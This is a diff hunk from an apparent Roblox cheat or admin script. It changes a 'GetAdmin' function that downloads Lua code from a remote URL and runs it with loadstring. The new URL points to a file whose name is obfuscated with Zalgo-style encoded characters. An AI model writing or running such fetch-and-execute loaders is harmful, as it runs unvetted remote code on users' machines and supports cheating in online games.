@@ -121,7 +121,7 @@ local AdminStuff = {
 	sayMessage =ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"),
 
 	GetAdmin = function()
-		return loadstring(game:HttpGet("https://git.aphixe.lol/oden/prisoncheatsmp4/raw/branch/main/ohkayyy"))()
+		return loadstring(game:HttpGet("https://raw.githubusercontent.com/uujxUjio/Imperial/refs/heads/main/D%CC%B7%CD%9B%CD%82%CC%A7%CD%85%C3%A5%CC%B8%CC%94%CC%9A%CC%9C7%D2%89%CC%A8%CC%8D%C4%85%CC%B7%CD%98%CC%8E%CC%ACM%D2%88%CC%B5%CC%863%CD%9C%CC%9B%CC%BF%CC%A9N%CC%B8%CD%9B%CC%91!%D2%89%CC%BA%CD%85"))()
 	end,
 }
 
